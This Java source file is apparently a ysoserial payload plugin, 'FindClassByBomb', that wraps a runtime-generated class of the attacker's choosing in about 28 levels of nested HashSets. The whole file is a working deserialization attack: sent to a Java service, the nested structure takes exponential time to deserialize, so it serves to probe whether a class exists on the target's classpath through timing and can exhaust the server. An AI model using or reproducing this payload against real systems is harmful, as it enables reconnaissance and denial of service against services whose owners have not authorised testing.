package probeGadget;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;

import java.util.HashSet;
import java.util.Set;


public class FindClassByBomb extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {
        int depth;
        String className = null;

        if(command.contains("|")){
            String[] x = command.split("\\|");
            className = x[0];
            depth = Integer.valueOf(x[1]);
        }else{
            className = command;
            depth = 28;
        }

        Class findClazz = makeClass(className);
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }
    public static Class makeClass(String Classname) throws CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(Classname);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }
}
